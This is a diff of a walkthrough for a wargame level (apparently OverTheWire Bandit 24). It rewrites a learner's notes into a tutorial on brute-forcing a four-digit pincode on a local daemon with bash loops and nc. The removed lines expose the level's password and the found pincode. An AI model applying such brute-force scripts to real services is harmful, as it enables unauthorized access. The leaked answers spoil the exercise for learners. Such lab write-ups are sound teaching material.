@@ -1,29 +1,64 @@
-Looked at previous command I learnt throughout the game to see which one can help me connect - ssh, netcat, but “nc localhost 30002” outputted this message: “I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.” Then I thought it made sense to write a script to automatically write all the possible 10000 options automatically until I hit the correct one.
-Looked at the previous scripts in this game and saw “for i in …” and decided to use it myself, but didn’t know how to equalize width by padding with leading zeroes and there were two main options: “for i in {0000 … 9999}” or for “for i in $(seq -w 0 9999)” and then generate the line with the password written before the pincode - like “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 i”. Saw you have to add “do” and “done”, then you have to make it an executable file which I saved as a “.sh” (used “nano” to do all this so far) with “chmod +x …”. The problem that popped up was that it generated all 10000 lines in the “nc” connection without any output from the daemon, so it needed to be interactive to generate all of the verdicts. Then after some thought, I said I should create a “.txt” file where I have all the generated pincodes and create another executable file which takes every line from the text file and sends it to the daemon to check. So the code to generate those files is (called it “pincode_generator.sh”)
-“
-#!/bin/bash
-
-for i in $(seq -w 0 9999)
-
+The service running on port *30002* can be accessed using `nc`:
+```bash
+nc localhost 30002
+#output:
+#I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode 
+#on a single line, separated by a space.
+```
+## Generating All Possible Pincodes
+A **loop** is a control structure that repeatedly executes a block of commands until a defined condition is met. Loops are commonly used in scripting to automate repetitive tasks such as iterating through lists, files, or numerical ranges.  
+A **`for` loop** iterates over a sequence of values and executes a block of commands for each value in that sequence.
+```bash
+for variable in sequence
 do
-        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> pincode_possibilities.txt
+    commands
 done
-“
-So “pincode_possibilities.txt” has all the combinations - “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000”, “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001”, …, “gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9999” and I will redirect all of this input into the new “.sh” file, which I will write with “nano”. I looked at a website about bash scripting and saw this code reads each line from a file named input.txt and prints it to the terminal: “
-while read line
-do
-  echo $line
-done < input.txt
-“
-Instead of “input.txt”, I used “pincode_possibilities.txt” and then added “nc localhost 30002” as a pipe after the redirection so that “nc” treats the file as stdin, not just dumping the whole file at once. So the code for the file I named “print_possibilities.sh” looks like this: “
+```
+A Bash script that uses a loop can be used to generate every pincode together with the known password. 
+```bash
+vi pincode_generator.sh
+```
+Script contents:
+```bash
 #!/bin/bash
 
-while read line 
+for i in $(seq -w 0 9999) #the "-w" option ensures fixed width with leading zeros, which is required for valid pincodes, therefore generating numbers from 0000 to 9999
+
 do 
-        echo $line 
+        echo *bandit24password* $i >> pincode_possibilities.txt #writes the password together with the current pincode
+done
+```
+In Bash, the `>>` operator is used to append output to a file. This operator differs from `>`:  
+• `>` - overwrites the file's contents  
+• `>>` - appends new content to the end of the file without removing existing data  
+## Sending Attempts to the Service
+Sending the entire file directly to the service does not produce usable feedback because the daemon processes input sequentially. Instead, each line should be transmitted individually.  
+A second script can be used to read each line from the generated file and send it to the service:
+```bash
+vi print_possibilities.sh
+```
+Script contents:
+```bash
+#!/bin/bash
+
+while read line #reads each line from "pincode_possibilities.txt"
+do 
+        echo $line #outputs the current password-pincode pair
 done < pincode_possibilities.txt | nc localhost 30002 >> possibilities_output.txt
-“
-You “chmod +x” then run it with “./“ and will give you the password.
-OPTIONAL:
-Catch is you won’t see which pincode is the correct one - it will just say “correct” and give you the password, but I wanted to test myself and see if I can do it. After trying other things and over-complicating it, I realised I can easily redirect all of the output in a file that I called “possibilities_output.txt” and “grep -n” wherever I see the word “correct”, as “-n” shows you the line where this pops up.
-After doing that, I get - “9164: Correct”, but the first line is “I am the …” and the pinches start from “0000” so you subtract two from the line number to get the actual correct pincode, which is 9162.
+```
+Explanation:  
+• `|` - forwards the output to nc  
+• `nc` - localhost 30002 sends each attempt to the pincode service  
+• `>>` - possibilities_output.txt stores all responses for later analysis    
+Make the script executable and run it:
+```bash
+chmod +x print_possibilities.sh
+./print_possibilities.sh
+```
+## OPTIONAL - Identifying the Correct Pincode
+
+To locate the successful attempt, search for the word *Correct* in the output file:
+```bash
+grep -n "Correct" possibilities_output.txt #"-n" flag prints the line number where the match occurs.
+```
+The first line of the output file contains the daemon's initial message, and the brute-force attempts start afterward. Adjusting for this offset reveals that the correct pincode corresponds to the number two units smaller.
